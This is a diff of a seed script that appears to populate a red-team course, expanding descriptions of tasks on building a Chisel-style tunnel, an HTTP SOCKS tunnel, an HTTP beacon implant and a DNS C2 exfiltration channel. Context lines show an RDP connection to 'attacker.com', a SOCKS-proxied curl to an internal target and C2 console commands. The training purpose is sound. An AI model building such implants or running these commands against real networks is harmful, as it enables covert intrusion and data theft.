@@ -27,7 +27,7 @@ const path1 = insertPath.run(
 // Module 1: Pivoting Tools
 const mod1 = insertModule.run(path1.lastInsertRowid, 'Build Pivoting Tools', 'Implement tunneling and port forwarding tools', 0, now);
 
-insertTask.run(mod1.lastInsertRowid, 'Build TCP Tunnel (Chisel-style)', 'Create a reverse tunneling tool in Go', `## Chisel Clone - TCP Tunneling Tool
+insertTask.run(mod1.lastInsertRowid, 'Build TCP Tunnel (Chisel-style)', 'Implement a TCP-over-HTTP tunnel in Go supporting reverse connections through firewalls, SOCKS5 proxy mode, port forwarding, and WebSocket transport for pivoting through compromised hosts', `## Chisel Clone - TCP Tunneling Tool
 
 ### How Chisel Works
 \`\`\`
@@ -371,7 +371,7 @@ go build -o tunnel tunnel.go
 rdesktop attacker.com:3389
 \`\`\``, 0, now);
 
-insertTask.run(mod1.lastInsertRowid, 'Build SOCKS Proxy over HTTP', 'Tunnel SOCKS through HTTP for firewall bypass', `## HTTP SOCKS Tunnel
+insertTask.run(mod1.lastInsertRowid, 'Build SOCKS Proxy over HTTP', 'Implement a SOCKS5 proxy that encapsulates traffic within HTTP requests, allowing network pivoting through restrictive firewalls and proxies that only permit web traffic on ports 80 and 443', `## HTTP SOCKS Tunnel
 
 ### Why HTTP Tunneling?
 \`\`\`
@@ -656,7 +656,7 @@ curl --socks5 127.0.0.1:1080 http://internal.target/
 // Module 2: C2 Implants
 const mod2 = insertModule.run(path1.lastInsertRowid, 'Build C2 Implants', 'Create cross-platform agents with beaconing and encryption', 1, now);
 
-insertTask.run(mod2.lastInsertRowid, 'Build Basic HTTP Beacon', 'Create a simple C2 implant with command execution', `## HTTP Beacon Implant
+insertTask.run(mod2.lastInsertRowid, 'Build Basic HTTP Beacon', 'Create a C2 implant that periodically polls an HTTP endpoint for tasking, executes received commands, and returns output, implementing basic sleep intervals and encrypted communication', `## HTTP Beacon Implant
 
 ### Beacon Architecture
 \`\`\`
@@ -1012,7 +1012,7 @@ C2> cmd 123456789 whoami
 C2> cmd 123456789 ipconfig /all
 \`\`\``, 0, now);
 
-insertTask.run(mod2.lastInsertRowid, 'Build DNS C2 Channel', 'Exfiltrate data and receive commands over DNS', `## DNS C2 Channel
+insertTask.run(mod2.lastInsertRowid, 'Build DNS C2 Channel', 'Implement covert command and control using DNS queries and responses, encoding commands in TXT records or subdomain labels, and chunking large data transfers across multiple queries for exfiltration', `## DNS C2 Channel
 
 ### Why DNS C2?
 \`\`\`
